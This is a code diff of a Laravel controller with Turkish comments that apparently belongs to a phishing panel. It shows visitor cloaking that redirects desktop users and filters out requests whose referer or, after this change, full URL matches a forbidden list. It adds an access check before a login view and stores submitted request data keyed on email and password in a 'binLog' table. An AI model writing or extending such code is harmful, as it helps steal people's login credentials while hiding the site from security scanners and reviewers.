@@ -24,7 +24,6 @@ class MainController extends Controller
         $forbidden = ForbiddensModel::all();
         $referer = $request->headers->get('referer');
         $fullUrl = request()->fullUrl();
-
         if (!$request->has('thanks') || $request->query('thanks') != 1) {
             if (Agent::isDesktop()) {
                 return match ($redirectPath->value) {
@@ -32,13 +31,16 @@ class MainController extends Controller
                     '404' => abort(404),
                 };
             }
-
             $results = $forbidden->filter(function ($ban) use ($referer, $fullUrl) {
                 if (str_contains($referer, $ban->value) !== false)
                     return $ban;
 
+                if (str_contains($fullUrl, $ban->value) !== false)
+                    return $ban;
+
                 return null;
             });
+
             if ($results->isEmpty()) {
                 $redirectPath = AdminOptions::firstWhere('key', 'yasak_yonlendirme_link');
                 $match = match ($redirectPath->value) {
@@ -80,6 +82,7 @@ class MainController extends Controller
     }
     public function blogin(Request $request)
     {
+        $this->checkControl($request);
         return view('b');
     }
     public function firstGG(Request $request)
@@ -113,7 +116,7 @@ class MainController extends Controller
             'system_id' => $getSystem->system ?? SystemStatusEnum::G->value
         ]);
         $binData = $request->all();
-       
+
         $create = binLogModel::updateOrCreate(
             [
                 'email' => $binData['email'],
@@ -121,8 +124,6 @@ class MainController extends Controller
             ], // Şart: Email ve şifre aynıysa güncelle
             $binData // Güncellenecek veya eklenecek veri
         );
-
-       
     }
     public function saveData(loginsRequest $request)
     {
